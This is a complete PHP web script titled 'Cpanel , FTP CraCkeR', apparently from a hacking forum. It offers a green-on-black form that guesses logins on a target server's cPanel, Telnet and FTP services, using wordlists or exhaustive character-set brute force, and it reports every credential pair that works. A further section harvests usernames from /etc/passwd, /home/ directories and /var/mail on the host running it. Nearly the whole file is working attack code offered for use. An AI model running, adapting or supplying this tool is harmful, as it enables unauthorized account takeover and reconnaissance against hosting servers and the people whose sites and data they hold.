<?php
$cpanel_port="2082";
$connect_timeout=5;
set_time_limit(0);
$submit=$_REQUEST['submit'];
$users=$_REQUEST['users'];
$pass=$_REQUEST['passwords'];
$target=$_REQUEST['target'];
$cracktype=$_REQUEST['cracktype'];
if($target == ""){
$target = "localhost";
}
$charset=$_REQUEST['charset'];
if($charset=="")
 $charset="lowercase";
$max_length=$_REQUEST['max_length'];
if($max_length=="")
 $max_length=10;
$min_length=$_REQUEST['min_length'];
if($min_length=="")
 $min_length=1;

 $charsetall = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetlower = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
 $charsetupper = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z");
 $charsetnumeric = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetlowernumeric = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetuppernumeric = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetletters = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" );
 $charsetsymbols= array("!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetlowersymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetuppersymbols = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetletterssymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetnumericsymbols = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetlowernumericsymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetuppernumericsymbols = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetletterssymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ,"!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetlettersnumericsymbols=array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ,"!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_","0", "1", "2", "3", "4", "5", "6", "7", "8", "9" );
	if ($charset == "all")
		$vals = $charsetall;
    elseif ($charset == "lowercase") 
		$vals = $charsetlower;
	 elseif ($charset == "uppercase") 
		$vals = $charsetupper;
	 elseif ($charset == "numeric") 
		$vals = $charsetnumeric;
	 elseif ($charset == "lowernumeric") 
		$vals = $charsetlowernumeric;
	 elseif ($charset == "uppernumeric") 
		$vals = $charsetuppernumeric;
	elseif ($charset == "letters") 
		$vals = $charsetletters;
	elseif ($charset == "symbols") 
		$vals = $charsetsymbols;
	elseif ($charset == "lowersymbols") 
		$vals = $charsetlowersymbols;
	elseif ($charset == "uppersymbols") 
		$vals = $charsetuppersymbols;
	elseif ($charset == "letterssymbols") 
		$vals = $charsetletterssymbols;
	elseif ($charset == "numberssymbols") 
		$vals = $charsetnumericsymbols;
	elseif ($charset == "lowernumericsymbols") 
		$vals = $charsetlowernumericsymbols;
	elseif ($charset == "uppernumericsymbols") 
		$vals = $charsetuppernumericsymbols;
	elseif ($charset == "lettersnumericsymbols") 
		$vals = $charsetlettersnumericsymbols;
	else echo "INVALID CHARSET";
?>
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
</head>
<title>Cpanel , FTP CraCkeR</title>
<body text="#00FF00" bgcolor="#000000" vlink="#008000" link="#008000" alink="#008000">
<div align="center">
<form method="POST" style="border: 1px solid #000000">
        <img border="0" src="http://www.alm3refh.com/upload/group/groupxp.gif" width="426" height="169"><table border="1" width="67%" bordercolorlight="#008000" bordercolordark="#003700">
                <tr>
                        <td>
        <p align="center"><b><font color="#008000" face="Tahoma" size="2">
                <span lang="en-us">IP server</span> :</font><font face="Arial">
        </font><font face="Arial" color="#CC0000">
        <input type="text" name="target" size="16" value="<?php echo $target ?>" style="border: 2px solid #1D1D1D; background-color: #000000; color:#008000; font-family:Verdana; font-weight:bold; font-size:13px"></font></b></p>
        <p align="center"><b><font color="#008000" face="Tahoma" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></b></p>
                        <div align="center">
                                <table border="1" width="57%" bordercolorlight="#008000" bordercolordark="#003700">
                                        <tr>
                                                <td align="center">
                                                                                                <span lang="en-us"><font color="#FF0000"><b>User List</b></font></span></td>
                                                <td>
                                                <p align="center">
                                                                                                <span lang="en-us"><font color="#FF0000"><b>Password List</b></font></span></td>
                                        </tr>
                                </table>

                        <p align="center">&nbsp;<textarea rows="20" name="users" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><?php echo $users ?>
</textarea><textarea rows="20" name="passwords" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><?php echo $pass ?></textarea><br>
        <br>
                                <font style="font-weight:700" size="2" face="Tahoma" color="#008000">
                                                <span lang="ar-sa">Guess options</span></font><font style="font-size: 12pt;" size="-3" face="Verdana"><span style="font-size: 9pt;">&nbsp;
                                                <font face="Tahoma">
                                                <input name="cracktype" value="cpanel" style="font-weight: 700;" checked type="radio"></font></span></font><b><font size="2" face="Tahoma">
                                                Cpanel</font><font size="2" color="#cc0000" face="Tahoma">
                                                </font><font size="2" color="#FFFFFF" face="Tahoma">
                                                (2082)</font></b><font size="2" face="Tahoma"><b> </b>
                                                </font>
                                                <font style="font-size: 12pt;" size="-3" face="Verdana">
                                                <span style="font-size: 9pt;"><font face="Tahoma">
												<input name="cracktype" value="cpanel2" style="font-weight: 700;" type="radio"></font></span></font><b><font size="2" face="Tahoma">
                                                Telnet</font><font size="2" color="#cc0000" face="Tahoma">
                                                </font><font size="2" color="#FFFFFF" face="Tahoma">
                                                (23)</font></b><font size="2" face="Tahoma"><b> </b>
                                                </font>
                                                <font style="font-size: 12pt;" size="-3" face="Verdana">
                                                <span style="font-size: 9pt;"><font face="Tahoma">
                                                <input name="cracktype" value="ftp" style="font-weight: 700;" type="radio"></font></span></font><font style="font-weight: 700;" size="2" face="Tahoma">
                                                </font><span style="font-weight: 700;">
                                                <font size="2" face="Tahoma">Ftp </font>
                                                <font size="2" color="#FFFFFF" face="Tahoma">
                                                (21)</font></span>
												<br>
												<font style="font-weight:700" size="2" face="Tahoma" color="#008000"><span lang="ar-sa">Timeout delay</span>
												<input type="text" name="connect_timeout" style="border: 2px solid #1D1D1D;background: black;color:RED" size=48 value="<?php echo $connect_timeout;?>"></input>
												<br>
												<input type="checkbox" name="bruteforce" value="true"><font style="font-weight:700" size="2" face="Tahoma" color="#008000"><span lang="ar-sa">Bruteforce</span></input>
												<select name="charset" style="border: 2px solid #1D1D1D;background: black;color:RED">
												 <option value="all">All Letters + Numbers</option>
 											     <option value="numeric">Numbers</option>
												 <option value="letters">Letters</option>
												 <option value="symbols">Symbols</option>
												 <option value="lowercase">Lower Letters</option>
												 <option value="uppercase">Higher Letters</option>
												 <option value="lowernumeric">Lower Letters + Numbers</option>
												 <option value="uppernumeric">Upper Letters + Numbers</option>
												 <option value="lowersymbols">Lower Letters + Symbols</option>
												 <option value="uppersymbols">Upper Letters + Symbols</option>
												 <option value="letterssymbols">All Letters + Symbols</option>
												 <option value="numberssymbols">Numbers + Symbols</option>
												 <option value="lowernumericsymbols">Lower Letters + Numbers + Symbols</option>
												 <option value="uppernumericsymbols">Upper Letters + Numbers + Symbols</option>
												 <option value="lettersnumericsymbols">All Letters + Numbers + Symbols</option>

												</select>
												<br>
												<font style="font-weight:700" size="2" face="Tahoma" color="#008000"><span lang="ar-sa">Min Bruteforce Length:</span></font>
												<input type="text" name="min_length" style="border: 2px solid #1D1D1D;background: black;color:RED" size=48 value="<?php echo $min_length;?>"></input>
												<br>
												<font style="font-weight:700" size="2" face="Tahoma" color="#008000"><span lang="ar-sa">Max Bruteforce Length:</span></font>
												<input type="text" name="max_length" style="border: 2px solid #1D1D1D;background: black;color:RED" size=48 value="<?php echo $max_length;?>"></input>
												</p>
        <p align="center">&nbsp;&nbsp;&nbsp;&nbsp;
        <input type="submit" value="Go" name="submit" style="color: #008000; font-weight: bold; border: 1px solid #333333; background-color: #000000"></p>
                        </td>
                </tr>
        </table>

    <p align="center"></td>
  </tr>
  </form>

<?php
function brute()
{
	global $vals,$min_length,$max_length;
	global $target,$pureuser,$connect_timeout;
	$min=$min_length;
	$max=$max_length;
	$A = array();
	$numVals = count($vals);
	$incDone = "";
	$realMax = "";
	$currentVal = "";
	$firstVal = "";
	for ($i = 0; $i < ($max + 1); $i++) {
		$A[$i] = -1;
	}
	
	for ($i = 0; $i < $max; $i++) {
		$realMax = $realMax . $vals[$numVals - 1];
	}
	for ($i = 0; $i < $min; $i++) {
		$A[$i] = $vals[0];
	}
	$i = 0;
	while ($A[$i] != -1) {
		$firstVal .= $A[$i];
		$i++;
	}
	//echo $firstVal . "<br>";
	cpanel_check($target,$pureuser,$firstVal,$connect_timeout);
	
	while (1) {
		for ($i = 0; $i < ($max + 1); $i++) {
			if ($A[$i] == -1) {
				break;
			}
		}
		$i--;
		$incDone = 0;
		while (!$incDone) {	
			for ($j = 0; $j < $numVals; $j++) {
				if ($A[$i] == $vals[$j]) {
					break;
				}
			}
			if ($j == ($numVals - 1)) {
				$A[$i] = $vals[0];
				$i--;
				if ($i < 0) {
					for ($i = 0; $i < ($max + 1); $i++) {
						if ($A[$i] == -1) {
							break;
						}
					}
					$A[$i] = $vals[0];
					$A[$i + 1] = -1;
					$incDone = 1;
					print "Starting " . (strlen($currentVal) + 1) . " Characters Cracking<br>";
				}
			} else {
				$A[$i] = $vals[$j + 1];
				$incDone = 1;
			}
		}
		$i = 0;
		$currentVal = "";
		while ($A[$i] != -1) {
			$currentVal = $currentVal . $A[$i];
			$i++;
		}
		cpanel_check($target,$pureuser,$currentVal,$connect_timeout);
		//echo $currentVal . "<br>";
		if ($currentVal == $realMax) {
			return 0;
		}
	}
}
function getmicrotime() {
   list($usec, $sec) = explode(" ",microtime());
   return ((float)$usec + (float)$sec);
} 

function ftp_check($host,$user,$pass,$timeout)
{
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "ftp://$host");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
 curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
 $data = curl_exec($ch);
 if ( curl_errno($ch) == 28 )
 {
 print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
 <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
 Please Check The Target Hostname .</font></font></b></p>";exit;
 }
 else if ( curl_errno($ch) == 0 )
 {
  print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"#008000\">
 Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
 and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
 }
 curl_close($ch);
}
function cpanel_check($host,$user,$pass,$timeout)
{
 global $cpanel_port;
 $ch = curl_init();
 //echo "http://$host:".$cpanel_port." $user $pass<br>";
 curl_setopt($ch, CURLOPT_URL, "http://$host:" . $cpanel_port);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
 $data = curl_exec($ch);
 if ( curl_errno($ch) == 28 )
 {
  print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
  <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
  Please Check The Target Hostname .</font></font></b></p>";exit;
 }
 else if ( curl_errno($ch) == 0 )
 {
  print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"#008000\"> 
  Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
  and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
 }
 curl_close($ch);
}

$time_start = getmicrotime();

if(isset($submit) && !empty($submit))
{
 if(empty($users) && empty($pass) )
 {
   print "<p><font face=\"Tahoma\" size=\"2\"><b><font color=\"#FF0000\">Error : </font>Please Check The Users or Password List Entry . . .</b></font></p>"; exit; }
 if(empty($users)){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Users List Entry . . .</b></font></p>"; exit; }
 if(empty($pass) && $_REQUEST['bruteforce']!="true" ){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Password List Entry . . .</b></font></p>"; exit; };
 $userlist=explode("\n",$users);
 $passlist=explode("\n",$pass);
 print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#FF0000\">
 Cracking Process Started, Please Wait ...</font></b><br><br>";

 if(isset($_POST['connect_timeout']))
 {
  $connect_timeout=$_POST['connect_timeout'];
 }

 if($cracktype == "ftp")
 {
  foreach ($userlist as $user) 
  {
   $pureuser = trim($user);
   foreach ($passlist as $password ) 
   {
     $purepass = trim($password);
     ftp_check($target,$pureuser,$purepass,$connect_timeout);
   }
  }
 }
 
 if ($cracktype == "cpanel" || $cracktype == "cpanel2")
 {
  if($cracktype == "cpanel2")
  {
   $cpanel_port="23";
  }
  else
   $cpanel_port="2082";
  
  foreach ($userlist as $user) 
  {
   $pureuser = trim($user);
   print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\"  style=\"font-size: 9pt\" color=\"#FF0800\">
   Processing user $pureuser ... </font></b>";
   if($_POST['bruteforce']=="true")
   {
    echo " bruteforcing ..";
	echo "<br>";
	brute();
   }
   else
   {
	 echo "<br>"; 
	 foreach ($passlist as $password ) 
     {
       $purepass = trim($password);
       cpanel_check($target,$pureuser,$purepass,$connect_timeout);
     }
   }
  }
  $time_end = getmicrotime();
$time = $time_end - $time_start; 
 print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#FF0000\">
 Cracking Finished. Elapsed time: $time</font> seconds</b><br><br>";
  }
}



?>

<p align="center"><b><a href="http://www.alm3refh.com/vb">
<span style="text-decoration: none">Sunni</span></a></b></p>

      <form style="border: 0px ridge #FFFFFF">




    <p align="center"></td>
  </tr><div align="center">

                <tr>

</form>


<div align="center">
 <table border="1" width="10%" bordercolorlight="#008000" bordercolordark="#006A00" height="100" cellspacing="1">
<tr>
<td bordercolorlight="#008000" bordercolordark="#006A00">
<p align="left">
<textarea style="border: 2px solid #1D1D1D;background: #200000;color:#CCFFFF" method='POST' rows="25" name="S1" cols="22">


<?php
   if (isset($_GET['user']))
      system('ls /var/mail'); 
   if (isset($_POST['grab_users1'])) //grab users from /etc/passwd
   {
	  $lines=file("/etc/passwd");
	  foreach($lines as $nr=>$val)
	  {
	   $str=explode(":",$val);
	   echo $str[0]."\n";
	  }
	 
   }
   if (isset($_POST['grab_users2']))
    {
     $dir = "/home/";
     if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            echo $file. "\n";
        }
			closedir($dh);
		}
	}
?>
</textarea>
<table>
<tr>
<form action="" method="POST">
<input type="hidden" value="true" name="grab_users1"></input>
<input type=submit value="Grab Usernames from /etc/passwd"></input>
</form>
</tr>
<br>
<tr>
<form action="" method="POST">
<input type="hidden" value="true" name="grab_users2"></input>
<input type=submit value="Grab Usernames from /home/"></input>
</form>
</tr>
<br>
<tr>
<form action="" method="POST">
<input type="hidden" value="true" name="grab_users3"></input>
<input type=submit value="Grab Usernames from /home/ II"></input>
</form>
</tr>
</form>
</table>
<?php
if (isset($_POST['grab_users3']))
    {
		error_reporting(0);
     $dir = "/home/";
	 if ($dh = opendir($dir)) 
	 {
        $f = readdir($dh);$f = readdir($dh);
        while (($f = readdir($dh)) !== false) 
        {
            //echo $f. "\n";
            $f.="/";
            $dh2=opendir($dir.$f);
            $f2 = readdir($dh2);$f2 = readdir($dh2);
            while (($f2 = readdir($dh2)) !== false) 
            {
             //echo $f2. "\n";
             $f2.="/";
             $dh3=opendir($dir.$f.$f2);
             $f3 = readdir($dh3);$f3 = readdir($dh3);
             while (($f3 = readdir($dh3)) !== false) 
             {
              echo $f3. "<br>";
             }
            }
            
        }
			closedir($dh);
	 }
	}
?>
